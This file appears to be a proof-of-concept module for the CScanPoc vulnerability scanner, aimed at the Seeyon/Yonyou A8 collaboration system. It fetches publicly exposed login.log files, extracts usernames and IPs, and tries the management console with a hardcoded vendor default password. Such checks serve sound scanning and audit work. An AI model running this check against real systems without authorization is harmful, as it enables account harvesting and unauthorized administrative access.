# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import re


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0033'  # 平台漏洞编号，留空
    name = '致远A8协同管理系统 泄露JSESSIONID'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-11-05'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        由于致远A8协同管理系统会对用户登录信息进行日志记录，可是日志文件存放在web目录的logs子目录下，
        并且未作任何权限控制，测试发现大部分在用系统都存在logs目录遍历漏洞，因此导致致远A8协同管理系统用户登录信息泄露。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0157458'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cfdc4aac-eb3b-4c11-852f-9dbd63805498'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Reference :http://www.wooyun.org/bugs/wooyun-2015-0157458
            # Reference :http://wooyun.org/bugs/wooyun-2010-081757
            hh = hackhttp.hackhttp()
            url = self.target
            # test on Login.log
            payloads = ['/seeyon/logs/login.log', '/logs/login.log']
            for payload in payloads:
                code, head, res, errcode, _ = hh.http(url + payload)
                if code == 200:
                    m = re.search(
                        '\d{2}\:\d{2}\:\d{2}(.*),\s?((?:\d{1,3}\.){3}\d{1,3})', res)
                    if m:
                        #security_info('Login info:'+','.join(m.groups()))
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                        break

            # test on management info
            code, head, res, errcode, _ = hh.http(
                url + '/seeyon/management/index.jsp', post='password=WLCCYBD@SEEYON')
            if code == 302 and ('seeyon/management/status.jsp' in head):
                    #security_info('Management info with Default password')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
